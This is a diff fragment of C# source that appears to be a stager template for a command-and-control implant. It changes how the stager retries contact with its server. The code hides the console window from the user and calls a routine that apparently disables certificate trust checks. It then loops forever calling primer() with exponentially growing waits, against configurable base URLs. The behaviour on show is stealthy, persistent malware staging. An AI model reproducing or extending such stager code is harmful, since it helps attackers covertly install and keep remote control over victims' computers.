@@ -30,24 +30,40 @@ public class Program
 	public static string[] dfhead = null;
 	private static string[] basearray = {#REPLACEBASEURL#};
 	public static string[] rotate = null;
+
 	public static void Sharp()
 	{
 		var handle = GetConsoleWindow();
 		ShowWindow(handle, SW_HIDE);
 		AUnTrCrts();
-		try { primer(); } catch {
+
+		if(#REPLACESTAGERRETRIES#)
+		{
+			int waitTime = #REPLACESTAGERRETRIESWAIT# * 1000;
 			var mre = new System.Threading.ManualResetEvent(false);
-			mre.WaitOne(300000);
-			try { primer(); } catch {
-				mre.WaitOne(600000);
-				try { primer(); } catch { }
+			while(true){
+				try {
+					primer();
+					break;
+				} catch {
+					mre.WaitOne(waitTime);
+					waitTime = waitTime * 2;
+				}
 			}
 		}
+		else
+		{
+			primer();
+		}
+
+
 	}
+
 	public static void Main()
 	{
 		Sharp();
 	}
+
     static string[] CLArgs(string cl)
     {
         int argc;
@@ -571,4 +587,3 @@ public class Program
 		}
 	}
 }
-
